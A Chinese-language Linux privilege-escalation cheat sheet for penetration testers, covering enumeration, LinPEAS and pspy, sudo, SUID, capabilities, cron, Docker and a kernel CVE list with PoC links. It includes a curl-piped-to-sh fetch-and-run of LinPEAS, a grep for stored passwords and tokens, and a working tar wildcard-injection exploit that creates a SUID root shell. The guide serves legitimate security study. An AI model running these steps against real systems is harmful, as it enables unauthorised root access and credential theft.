# Linux 本地提权速记

## 0x01 概述

适用于已经拿到 Linux 低权限 Shell，需要进一步提升到高权限用户时的快速排查。实际提权通常不是单一漏洞，而是以下几类问题的组合：

- 配置错误：`sudo`、SUID、Capability、计划任务、NFS、Docker。
- 凭证泄漏：历史命令、配置文件、备份文件、环境变量。
- 内核漏洞：版本老、补丁缺失、容器逃逸面较大。
- 运行时缺陷：服务脚本可写、PATH 污染、文件权限错误。

## 0x02 前置条件

- 已获得目标主机普通用户权限。
- 能稳定执行命令，最好具备交互式 TTY。
- 优先做信息枚举，再决定是否打内核漏洞。

## 0x03 基础枚举

### 1. 用户与系统信息

```bash
whoami
id
hostname
uname -a
cat /etc/issue
cat /etc/os-release
sudo -l
```

### 2. 敏感目录与文件权限

```bash
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
find / -writable -type d 2>/dev/null | head
find / -name "*.bak" -o -name "*.old" -o -name "*.swp" 2>/dev/null
```

### 3. 计划任务与服务

```bash
crontab -l
ls -al /etc/cron*
systemctl list-timers --all
ps aux
ss -tunlp
```

### 4. 环境与凭证

```bash
env
history
cat ~/.bash_history
grep -Rni "password\\|passwd\\|token\\|secret" /var/www /home /opt 2>/dev/null
```

## 0x04 自动化枚举工具

### 1. LinPEAS

全量枚举 SUID、Capability、计划任务、可写路径、凭证残留，输出红/绿标注风险等级（红色=高危）：

```bash
# 不落地，内存中直接执行
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# 或本地运行
./linpeas.sh -a
```

### 2. linux-exploit-suggester

按内核版本匹配公开提权 EXP，弥补手工记 CVE 的遗漏：

```bash
# https://github.com/jondonas/linux-exploit-suggester-2
./linux-exploit-suggester-2
# 或指定内核版本
./linux-exploit-suggester-2 -k 4.4.0
```

### 3. pspy

无需 root、不注入任何依赖，直接监控进程与 cron 触发，抓 root 定时任务执行的完整命令行与脚本路径：

```bash
# https://github.com/DominicBreuker/pspy
./pspy64 -pf -i 1000
```

典型用法：低权限挂上 pspy 等待 root 计划任务跑起来，观察它调用了哪个可写脚本，再针对性篡改。

## 0x05 常见提权方向

### 1. `sudo` 配置错误

先检查当前用户是否能免密执行高权限命令：

```bash
sudo -l
```

如果输出里包含可调用的解释器、编辑器或文件操作程序，优先去 [GTFOBins](https://gtfobins.github.io/) 查对应逃逸方式。常见高价值程序：

- `vim`
- `find`
- `less`
- `tar`
- `awk`
- `python`
- `perl`

### 2. SUID 提权

```bash
find / -user root -perm -4000 -print 2>/dev/null
```

重点关注非常规二进制，或者版本偏老的解释器与工具。常见思路：

- 利用支持执行命令的程序直接起 Shell。
- 利用可写配置文件或插件加载机制。
- 利用 PATH、环境变量、相对路径调用。

### 3. Capability 配置错误

```bash
getcap -r / 2>/dev/null
```

关注以下能力：

- `cap_setuid`
- `cap_dac_read_search`
- `cap_dac_override`
- `cap_sys_admin`

如果某个解释器被授予 `cap_setuid+ep`，通常可以直接切到 `uid=0`。

### 4. 计划任务与脚本可写

检查 root 定时任务是否调用了你可写的脚本、目录或通配符：

```bash
ls -lah /etc/cron.d
cat /etc/crontab
```

排查重点：

- 脚本路径是否可写。
- 调用命令是否使用相对路径。
- 是否存在 `tar *`、`rsync *` 这类通配符注入场景。

#### 通配符注入示例（tar）

root 的 cron 里若有 `tar czf /tmp/backup.tar.gz *` 这类在可写目录执行的命令，可借 tar 的 checkpoint 参数注入命令：

```bash
# 1. 写入要执行的命令
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /tmp/exploit.sh
chmod +x /tmp/exploit.sh

# 2. 在同一目录创建两个“参数文件”，* 展开后 tar 会把它们当命令行参数解析
touch /tmp/--checkpoint=1
touch '/tmp/--checkpoint-action=exec=sh /tmp/exploit.sh'
```

原理：`*` 展开成文件名后，tar 把 `--checkpoint=1` 与 `--checkpoint-action=exec=sh /tmp/exploit.sh` 当作参数解析，到达 checkpoint 时执行 exploit.sh；产出的 `/tmp/bash` 带 SUID 位，执行 `/tmp/bash -p` 即为 root。

### 5. 服务文件与 PATH 污染

查看 root 启动的服务脚本是否可写，或者是否调用未指定绝对路径的命令。

```bash
systemctl cat <service-name>
echo $PATH
```

### 6. Docker / LXC / 容器逃逸面

如果当前用户属于 `docker` 组，基本等同于高危权限：

```bash
id
docker ps
```

典型风险点：

- 可挂载宿主机目录。
- 可直接以 `--privileged` 启动容器。
- 可读取宿主机 Docker socket。

### 7. NFS、共享目录与错误挂载

检查共享目录是否启用了危险配置，例如 `no_root_squash`。这类问题常见于内网横向环境。

## 0x06 内核漏洞利用前的检查

只有在配置类提权无果时，再考虑内核漏洞。先确认：

1. 发行版版本和内核版本。
2. 是否有公开提权漏洞与之匹配。
3. 目标是否有编译环境，或者你是否能上传静态编译产物。
4. 利用后是否会导致内核崩溃或服务中断。

建议先做只读判断，不要上来就执行高风险 EXP。

## 0x07 经典内核漏洞清单

| CVE | 别名 | 影响版本 | 一句话利用 |
| ---- | ---- | ---- | ---- |
| CVE-2016-5195 | DirtyCow | 2.6.22 – 4.8.3 | COW 竞态写任意只读文件，覆写 /etc/passwd 或 SUID 程序提权 |
| CVE-2022-0847 | DirtyPipe | 5.8 – 5.16.11 | 管道缓冲区标志未清零，任意写只读文件（劫持 SUID 二进制起 root shell） |
| CVE-2019-7304 | DirtySock | snapd < 2.37 | snapd REST API UNIX socket 权限缺陷，可创建本地 root 用户 |
| CVE-2021-4034 | PwnKit | polkit pkexec（几乎所有发行版） | pkexec 环境变量注入（GCONV_PATH），直接获得 root shell |
| CVE-2017-1000112 | UFO | < 4.13.5 | UFO 队列内存损坏，篡改 skb 执行任意代码提权 |
| CVE-2010-3904 | RDS | 2.6.30 – 2.6.36 | RDS 协议套接字栈溢出，本地直接 root |
| CVE-2023-0386 | OverlayFS | 5.11 – 6.2 | OverlayFS 复制 SUID/cap 文件时丢失权限校验，配合 FUSE 拿 root |

POC 来源：

- DirtyCow: https://github.com/FireFart/dirtycow （覆写 /etc/passwd 注入 firefart 用户）
- DirtyPipe: https://dirtypipe.cm4all.com/ （官方分析与 PoC；SUID 劫持版可搜 blasty 的 dirtypipez.c）
- DirtySock: https://github.com/initstring/dirty_sock
- PwnKit: https://github.com/arthepsy/CVE-2021-4034 （Qualys 原始分析: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt）
- OverlayFS CVE-2023-0386: https://github.com/xkaneiki/CVE-2023-0386
- UFO / RDS 等老漏洞利用代码收录: https://github.com/SecWiki/linux-kernel-exploits

## 0x08 排查顺序建议

1. `id` / `sudo -l` / `uname -a`
2. SUID / Capability / 定时任务
3. 凭证与敏感配置文件
4. 服务脚本、PATH、可写目录
5. Docker / NFS / 容器环境
6. 最后才是内核漏洞

## 0x09 注意事项

- 优先找配置错误，成本低、稳定性高、噪声小。
- 提权前先留好当前会话和回连方式，避免把唯一入口打挂。
- 内核漏洞和容器逃逸风险最高，生产环境下尤其要谨慎。

## Ref

- https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
- https://gtfobins.github.io/
- https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html
- https://github.com/peass-ng/PEASS-ng （LinPEAS / WinPEAS 官方仓库）
